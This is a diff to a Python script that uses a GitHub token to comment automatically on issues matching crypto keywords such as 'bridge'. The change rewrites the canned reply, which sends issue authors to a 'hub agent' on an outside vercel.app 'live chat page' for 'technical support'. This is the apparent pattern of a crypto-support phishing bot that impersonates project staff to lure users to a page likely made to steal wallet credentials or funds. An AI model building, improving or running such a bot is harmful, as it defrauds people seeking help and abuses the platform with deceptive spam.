@@ -15,15 +15,14 @@ CRYPTO_KEYWORDS = [
     "bridge"
 ]
 
+# Your reply text
 AUTO_REPLY = """
-For quick review and assistance, contact the hub agent on the live chat page
-to report your issue via the Live chat page:
-https://securechain-dapps.vercel.app/
+For quick review and assistance, contact the hub agent on the live chat page to report your issue via the [Live chat page](https://securechain-dapps.vercel.app/) to ensure total review with the technical support.
 
 Team 🚀
 """
-)
 
+# GitHub API headers
 headers = {
     "Authorization": f"token {TOKEN}",
     "Accept": "application/vnd.github+json"
@@ -78,3 +77,4 @@ for issue in issues:
             print(f"Failed to post comment: {response.status_code}, {response.text}")
         else:
             print(f"Replied to issue #{issue_number}")
+
